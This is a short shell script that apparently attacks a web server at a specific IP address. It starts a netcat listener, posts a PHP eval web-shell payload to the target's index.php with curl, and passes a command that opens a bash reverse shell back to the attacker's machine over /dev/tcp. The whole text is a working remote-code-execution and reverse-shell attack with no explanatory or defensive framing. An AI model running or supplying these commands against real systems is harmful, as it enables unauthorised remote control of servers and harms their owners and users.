IP=$(curl -s ifconfig.me)
nc -lvnp 4444 &

curl -k -d "<?php @eval(\$_POST['p']);?>" \
"https://14.225.209.143:443/index.php" \
--data-urlencode "p=system('bash -i >& /dev/tcp/$IP/4444 0>&1');"
